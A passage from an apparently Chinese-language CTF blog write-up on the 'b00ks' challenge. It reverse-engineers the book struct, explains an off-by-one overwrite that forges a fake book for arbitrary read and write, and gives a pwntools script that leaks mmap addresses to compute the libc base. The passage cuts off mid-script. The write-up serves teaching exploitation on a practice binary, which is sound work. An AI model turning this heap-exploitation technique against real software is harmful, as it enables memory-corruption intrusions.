class="type">int</span> *)&amp;v1 - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合后面*((_QWORD *)off_202010 + v2) = v3分析，off_202010其实是一个数组（书柜）用来放置book对象的指针，循环遍历这个数字，如果数组对应下标为空，那么说明书柜有空位，返回对应下标，否则返回-1（-1的反码为0xFFFFFFFFLL）把sub_B24命名为check_space。</p>
<p>一旦有space就会给book对象malloc一个空间，稍微美化一下，容易看出在源码中book应该是一个结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">book = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( book )</span><br><span class="line">&#123;</span><br><span class="line">  book[<span class="number">6</span>] = desc_size;</span><br><span class="line">  *((_QWORD *)bookshelf + idx) = book;</span><br><span class="line">  *((_QWORD *)book + <span class="number">2</span>) = book_desc;</span><br><span class="line">  *((_QWORD *)book + <span class="number">1</span>) = book_name;</span><br><span class="line">  *book = ++unk_202024;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>不过这里反编译的仍然很混乱，unk_202024应该是一个int, book + 1, book + 2应该是两个8字节的指针，为什么放size的时候突然发到book[6]了？book这里一个item的大小究竟是多少？</p>
<p>我们回到这部分汇编再看一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000010F</span>A</span><br><span class="line">.text:<span class="number">00000000000010F</span>A loc_10FA:                               ; CODE XREF: create_book+<span class="number">18</span>D↑j</span><br><span class="line">.text:<span class="number">00000000000010F</span>A                 mov     edi, <span class="number">20</span>h ; <span class="string">&#x27; &#x27;</span>  ; size</span><br><span class="line">.text:<span class="number">00000000000010F</span>F                 call    _malloc</span><br><span class="line">.text:<span class="number">0000000000001104</span>                 mov     [rbp<span class="number">-18</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000001108</span>                 cmp     qword ptr [rbp<span class="number">-18</span>h], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000000110</span>D                 jnz     <span class="type">short</span> loc_1122</span><br><span class="line">.text:<span class="number">000000000000110F</span>                 lea     rdi, large cs:<span class="number">1618</span>h ; <span class="string">&quot;Unable to allocate book struct&quot;</span></span><br><span class="line">.text:<span class="number">0000000000001116</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000000111B</span>                 call    _printf</span><br><span class="line">.text:<span class="number">0000000000001120</span>                 jmp     <span class="type">short</span> loc_118F</span><br><span class="line">.text:<span class="number">0000000000001122</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000001122</span></span><br><span class="line">.text:<span class="number">0000000000001122</span> loc_1122:                               ; CODE XREF: create_book+<span class="number">1B</span>8↑j</span><br><span class="line">.text:<span class="number">0000000000001122</span>                 mov     eax, [rbp<span class="number">-20</span>h]      <span class="comment">//这里里面放的是desc size的值</span></span><br><span class="line">.text:<span class="number">0000000000001125</span>                 mov     edx, eax</span><br><span class="line">.text:<span class="number">0000000000001127</span>                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax放置book对象指针地址</span></span><br><span class="line">.text:<span class="number">000000000000112B</span>                 mov     [rax+<span class="number">18</span>h], edx     <span class="comment">//把edx赋值给book对象的第一个值，这个值是一个4字节的值</span></span><br><span class="line">.text:<span class="number">000000000000112</span>E                 lea     rax, bookshelf     <span class="comment">//把存放bookshelf数组地址的那个地址传入</span></span><br><span class="line">.text:<span class="number">0000000000001135</span>                 mov     rax, [rax]         <span class="comment">//拿到bookshelf数组的起始地址</span></span><br><span class="line">.text:<span class="number">0000000000001138</span>                 mov     edx, [rbp<span class="number">-1</span>Ch]     <span class="comment">//把idx放到edx里面</span></span><br><span class="line">.text:<span class="number">000000000000113B</span>                 movsxd  rdx, edx           <span class="comment">//把idx字节的值保留符号扩展到8字节</span></span><br><span class="line">.text:<span class="number">000000000000113</span>E                 shl     rdx, <span class="number">3</span>             <span class="comment">//把idx右移动3位相当于idx * 8 -&gt; 移动到指针的距离</span></span><br><span class="line">.text:<span class="number">0000000000001142</span>                 add     rdx, rax           <span class="comment">//rdx = bookshelf + idx * 8</span></span><br><span class="line">.text:<span class="number">0000000000001145</span>                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax = book地址</span></span><br><span class="line">.text:<span class="number">0000000000001149</span>                 mov     [rdx], rax         <span class="comment">//[bookshelf + idx * 8] = book地址</span></span><br><span class="line">.text:<span class="number">000000000000114</span>C                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax = book地址</span></span><br><span class="line">.text:<span class="number">0000000000001150</span>                 mov     rdx, [rbp<span class="number">-8</span>]       <span class="comment">//这里放的是desc指针</span></span><br><span class="line">.text:<span class="number">0000000000001154</span>                 mov     [rax+<span class="number">10</span>h], rdx     <span class="comment">//[book+0x10] = desc指针</span></span><br><span class="line">.text:<span class="number">0000000000001158</span>                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax放置book对象指针地址</span></span><br><span class="line">.text:<span class="number">000000000000115</span>C                 mov     rdx, [rbp<span class="number">-10</span>h]     <span class="comment">//[rbp-10h]的值name的指针</span></span><br><span class="line">.text:<span class="number">0000000000001160</span>                 mov     [rax+<span class="number">8</span>], rdx       <span class="comment">//[book + 0x8] = name的指针</span></span><br><span class="line">.text:<span class="number">0000000000001164</span>                 lea     rax, unk_202024     <span class="comment">// rax = unk_202024</span></span><br><span class="line">.text:<span class="number">000000000000116B</span>                 mov     eax, [rax]          <span class="comment">// eax = [unk_202024]</span></span><br><span class="line">.text:<span class="number">000000000000116</span>D                 lea     edx, [rax+<span class="number">1</span>]        <span class="comment">// edx = [unk_202024] + 1</span></span><br><span class="line">.text:<span class="number">0000000000001170</span>                 lea     rax, unk_202024     <span class="comment">// rax = [unk_202024]</span></span><br><span class="line">.text:<span class="number">0000000000001177</span>                 mov     [rax], edx          <span class="comment">// [unk_202024] = [unk_202024] + 1</span></span><br><span class="line">.text:<span class="number">0000000000001179</span>                 lea     rax, unk_202024     <span class="comment">// rax = unk_202024</span></span><br><span class="line">.text:<span class="number">0000000000001180</span>                 mov     edx, [rax]          <span class="comment">// edx = [unk_202024]</span></span><br><span class="line">.text:<span class="number">0000000000001182</span>                 mov     rax, [rbp<span class="number">-18</span>h]      <span class="comment">// rax = book</span></span><br><span class="line">.text:<span class="number">0000000000001186</span>                 mov     [rax], edx          <span class="comment">//*book = 4字节宽度的 unk_202024</span></span><br><span class="line">.text:<span class="number">0000000000001188</span>                 mov     eax, <span class="number">0</span>             </span><br><span class="line">.text:<span class="number">000000000000118</span>D                 jmp     <span class="type">short</span> locret_11CD</span><br><span class="line">.text:<span class="number">000000000000118F</span> ; ----------------------------------------</span><br></pre></td></tr></table></figure>

<p>综上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">book + <span class="number">0x18</span>h = desc_szie</span><br><span class="line">book + <span class="number">0x8</span>h =  name指针</span><br><span class="line">book + <span class="number">0x10</span>h = desc 指针</span><br><span class="line">book + <span class="number">0x0</span>h = <span class="type">int</span> number</span><br></pre></td></tr></table></figure>

<p>可见ida的反汇编结果不太准确。book结构体正确的偏移应该是。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="number">-4</span> <span class="type">int</span></span><br><span class="line"><span class="number">8</span><span class="number">-16</span> ptr</span><br><span class="line"><span class="number">16</span><span class="number">-24</span> ptr</span><br><span class="line"><span class="number">24</span><span class="number">-28</span> <span class="type">int</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id; </span><br><span class="line">    <span class="type">char</span> *name; <span class="comment">//因为对齐会占到8</span></span><br><span class="line">    <span class="type">char</span> *description;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">&#125; book;</span><br></pre></td></tr></table></figure>

<p>在ida中创建结构体</p>
<p><img src="image21.png"></p>
<p><img src="image22.png"></p>
<p><img src="image23.png"></p>
<p>这下就对味了, malloc完堆布局如下。</p>
<p><img src="image24.png"></p>
<h2 id="细说利用-泄漏libc地址"><a href="#细说利用-泄漏libc地址" class="headerlink" title="细说利用 (泄漏libc地址)"></a>细说利用 (泄漏libc地址)</h2><p>bookshelf数组里面放着第一个book的指针 (0x0000555555603710)</p>
<p><img src="image25.png"></p>
<p>Bookshelf和off_202018(author name相邻)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202010 bookshelf       dq offset unk_202060    ; DATA XREF: check_space:loc_B38↑o</span><br><span class="line">.data:0000000000202010                                         ; delete_book:loc_C1B↑o ...</span><br><span class="line">.data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: edit_author_name+<span class="number">15</span>↑o</span><br><span class="line">.data:0000000000202018                                         ; list_book+CA↑o</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=<span class="number">0x555555603010</span>, size=<span class="number">0x290</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x0000555555603010</span>     <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    ................]</span><br><span class="line">Chunk(addr=<span class="number">0x5555556032a0</span>, size=<span class="number">0x410</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x00005555556032a0</span>     <span class="number">33</span> <span class="number">32</span> 0a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="number">32.</span>.............]</span><br><span class="line">Chunk(addr=<span class="number">0x5555556036b0</span>, size=<span class="number">0x30</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x00005555556036b0</span>     <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    aaaaaaaaaa......]</span><br><span class="line">Chunk(addr=<span class="number">0x5555556036e0</span>, size=<span class="number">0x30</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x00005555556036e0</span>     <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    bbbbbbbbbb......]</span><br><span class="line">Chunk(addr=<span class="number">0x555555603710</span>, size=<span class="number">0x30</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [<span class="number">0x0000555555603710</span>     01 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> b0 <span class="number">36</span> <span class="number">60</span> <span class="number">55</span> <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>    ........<span class="number">.6</span>`UUU..]</span><br><span class="line">Chunk(addr=<span class="number">0x555555603740</span>, size=<span class="number">0x208d0</span>, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk</span><br><span class="line">gef➤  x /1xg <span class="number">0x555555602010</span></span><br><span class="line"><span class="number">0x555555602010</span>:        <span class="number">0x0000555555602060</span></span><br><span class="line">gef➤  x /2xg <span class="number">0x0000555555602060</span></span><br><span class="line"><span class="number">0x555555602060</span>:        <span class="number">0x0000555555603710</span>        <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p><img src="image26.png"></p>
<p>可以利用off-by-one把bookshelf的第一个指针最后一位覆盖为\x00。</p>
<p>如果我们可以把bookshelf抬高到上面description的位置，那么我们就可以提前在descripton里面伪造好book结构体的数据。</p>
<ul>
<li>然后触发edit book的时候，就可以把我们想修改的内存地址传入进去（fake book的name和description指针指向我们修改的地址）进而达到任意地址写的目的。</li>
<li>然后触发list book的时候，就可以把我们想修改的内存地址传入进去（fake book的name和description指针指向我们修改的地址）进而达到任意地址读的目的。</li>
</ul>
<p>这里需要倒推一下，不考虑地址随机化(ASLR)的话，malloc第一个book的name时，堆顶是0x5555556036b0 - 0x8（从prev_size开始算）</p>
<p><img src="image27.png"></p>
<p>不考虑ASLR如果name malloc 64字节，desc malloc 32字节。那么实际上book ptr的地址会是</p>
<p>0x5555556036b0 - 0x10 + request2size(64) + request2size(32) + 0x10</p>
<p>= 0x5555556036b0 - 0x10 + request2size(64) + request2size(32) + 0x10</p>
<p>= 0x5555556036b0 + 0x50 + 0x30 = 0x555555603730</p>
<p>0x555555603730置0成0x555555603700刚好就是book1 description的地址。</p>
<p>更通行通法的来讲，应该再下面这个约束里面找一个解就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + request2size(Y) + <span class="number">0x10</span></span><br><span class="line">(addr &amp; ~(<span class="number">0x100</span> - <span class="number">0x1</span>)) == <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + <span class="number">0x10</span></span><br><span class="line">request2size(Y) &gt;= size(book) </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SIZE_SZ = <span class="number">8</span>  <span class="comment"># 64位系统上 size_t 的大小  </span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">15</span>  <span class="comment"># 16字节对齐掩码 (0xF)  </span></span><br><span class="line">MINSIZE = <span class="number">32</span>  <span class="comment"># 假设的最小块大小  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request2size</span>(<span class="params">req</span>):  </span><br><span class="line">    <span class="keyword">if</span> req + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE:  </span><br><span class="line">        <span class="keyword">return</span> MINSIZE  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> (req + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> X <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">65</span>):</span><br><span class="line">    <span class="keyword">for</span> Y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">65</span>):</span><br><span class="line">        addr = <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + request2size(Y) + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( (addr &amp; ~(<span class="number">0x100</span> - <span class="number">0x1</span>)) == <span class="number">0x5555556036b0</span> - <span class="number">0x10</span> + request2size(X) + <span class="number">0x10</span> <span class="keyword">and</span> request2size(Y) &gt;= <span class="number">28</span>):</span><br><span class="line">            <span class="built_in">print</span>(X, Y)</span><br></pre></td></tr></table></figure>

<p>可以跑出来很多结果，我们随便挑一对验证。比如（57, 10）-&gt; 其实在后面还会发现第二个为了放payload还是需要更长一点。</p>
<p><img src="image28.png"></p>
<p>0x555555603720 -&gt; addr=0x555555603700回到description</p>
<p>PS: 看起来这个题目我目前只malloc了小内存块不超过0x1000所以没有跨内存页的问题，如果heap地址在ASLR的情况下其实地址按0x1000对齐也不影响？</p>
<p>现在已经知道可以读写任意地址了，但是这个题开了ASLR仍然不是知道libc的基地址。在PWN里面知道基地址是非常核心的一步，因为后面无论是覆盖free_hook或者别的地址，又或是找<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62675330/article/details/123274386">onegadget</a>都需要它。</p>
<p>这里泄漏的基地址方法是在book中使用非常大的size迫使malloc使用mmap来分配内存， <strong>mmap分配的内存和libc基地址有一个固定偏移</strong> 。我们只需要在book1中description字段构造一个fake book让他指向book2的description或者name之一就能再调用list book就能泄漏mmap地址进而通过固定地址偏移计算出libc地址。</p>
<p>至于为什么有这个所谓的“固定偏移”，我看网上的wp都是一笔带过（no offence）。</p>
<p><img src="image29.png"></p>
<p><img src="image30.png"></p>
<p>翻了一点kernel源码看，基本搞懂了原理，写在下面<strong>附 固定地址原理</strong></p>
<p><img src="image31.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&#x27;/home/parallels/Desktop/b00ks&#x27;</span>  </span><br><span class="line">io = process(binary_path)</span><br><span class="line">pwnlib.gdb.attach(proc.pidof(io)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add book 1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The first idx in bookshelf: &quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit book1</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_book_data = p64(<span class="number">0x1</span>) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> ) + p64(book1_addr + <span class="number">0x30</span> + <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">io.sendline(fake_book_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off-by-one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#add book2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">128</span>*<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;object2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##print Author</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Name: &#x27;)</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;Description: &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">name_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">name_mmap_addr = name_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br></pre></td></tr></table></figure>

<p><img src="image32.png"></p>
<p>这里还有一个小困惑，为什么libc-2.31.so被加载进来了这多次。</p>
<p><img src="image33.png"></p>
<p><img src="image34.png"></p>
<p>在本地调试的时候发现，chunk地址是0x00007fdcf6db5010，0x00007fdcf6d94010。我们就用第二个来算吧，libc相对description的固定偏移是0x7fdcf6dd6000 - 0x00007fdcf6d94010 = 0x41ff0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">desc_mmap_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">desc_mmap_addr = desc_mmap_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(name_mmap_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;desc_mmap_addr : &quot;</span> + <span class="built_in">hex</span>(u64(desc_mmap_addr)))</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(u64(desc_mmap_addr)) + <span class="number">0x41ff0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc addr : 